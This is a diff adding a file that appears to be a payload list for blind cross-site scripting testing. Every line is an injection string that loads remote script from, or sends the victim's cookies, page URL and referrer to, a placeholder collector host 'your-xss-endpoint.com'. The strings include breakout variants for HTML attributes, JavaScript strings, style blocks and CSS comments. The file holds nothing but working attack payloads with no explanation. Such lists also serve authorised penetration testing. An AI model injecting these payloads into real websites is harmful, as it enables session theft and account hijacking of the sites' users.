@@ -1,0 +1,33 @@
+<script src="https://your-xss-endpoint.com"></script>
+'><script src="https://your-xss-endpoint.com"></script>
+"><script src="https://your-xss-endpoint.com"></script>
+javascript:eval('var a=document.createElement("script");a.src="https://your-xss-endpoint.com";document.body.appendChild(a);')
+<script>function b(){eval(this.responseText);}var a=new XMLHttpRequest();a.addEventListener("load",b);a.open("GET","https://your-xss-endpoint.com");a.send();</script>
+<script>$.getScript("https://your-xss-endpoint.com");</script>
+document.location="https://your-xss-endpoint.com/index.php?c="+document.cookie;
+<img src="1" onerror="this.src='https://your-xss-endpoint.com'">
+<img src="1" onerror="this.src='https://your-xss-endpoint.com/index.php'">
+<img src="1" onerror="this.src='https://your-xss-endpoint.com/?'+document.cookie;">
+<img src="x" onerror="location.href='https://your-xss-endpoint.com/server.php?c='+document.cookie;">
+"><script src="https://your-xss-endpoint.com/basic-js"></script>
+"><script>new Image().src="https://your-xss-endpoint.com/img-basic?c="+document.cookie</script>
+"><script>fetch("https://your-xss-endpoint.com/fetch-basic?c="+encodeURIComponent(document.cookie))</script>
+"><img src=x onerror="this.src='https://your-xss-endpoint.com/img-onerror?c='+encodeURIComponent(document.cookie)">
+"><iframe src="javascript:top.location='https://your-xss-endpoint.com/iframe?c='+encodeURIComponent(document.cookie)"></iframe>
+"><svg onload="new Image().src='https://your-xss-endpoint.com/svg-onload?c='+encodeURIComponent(document.cookie)">
+" autofocus onfocus="new Image().src='https://your-xss-endpoint.com/onfocus?c='+encodeURIComponent(document.cookie)" x="
+" onmouseover="new Image().src='https://your-xss-endpoint.com/onmouseover?c='+encodeURIComponent(document.cookie)" x="
+" onclick="new Image().src='https://your-xss-endpoint.com/attr-click?c='+encodeURIComponent(document.cookie)" x="
+' onclick='new Image().src="https://your-xss-endpoint.com/attr-click2?c='+encodeURIComponent(document.cookie)" x='
+";fetch('https://your-xss-endpoint.com/js-end?c='+encodeURIComponent(document.cookie));//
+';fetch("https://your-xss-endpoint.com/js-end2?c="+encodeURIComponent(document.cookie));//
+");new Image().src="https://your-xss-endpoint.com/js-end3?c="+encodeURIComponent(document.cookie);//
+<script>(function(){var i=new Image();i.src="https://your-xss-endpoint.com/fullscript?c="+encodeURIComponent(document.cookie)+"&u="+encodeURIComponent(location.href);})();</script>
+"><script>(function(){var d=document;var data="cookie="+encodeURIComponent(d.cookie)+"&url="+encodeURIComponent(location.href)+"&ref="+encodeURIComponent(d.referrer);new Image().src="https://your-xss-endpoint.com/dom?"+data;})();</script>
+"><meta http-equiv="refresh" content="0;url=https://your-xss-endpoint.com/meta?c="+encodeURIComponent(document.cookie)>
+"><script>location='https://your-xss-endpoint.com/redirect?c='+encodeURIComponent(document.cookie)</script>
+"></style><script>new Image().src='https://your-xss-endpoint.com/style-break?c='+encodeURIComponent(document.cookie)</script><style>
+*/</style><script>new Image().src='https://your-xss-endpoint.com/css-comment?c='+encodeURIComponent(document.cookie)</script><!--
+"><svg/onload=fetch`https://your-xss-endpoint.com/s1?c=${document.cookie}`>
+"><img src=x onerror=fetch`https://your-xss-endpoint.com/s2?c=${document.cookie}`>
+"><script>location.href='https://your-xss-endpoint.com/s3?c='+document.cookie</script>
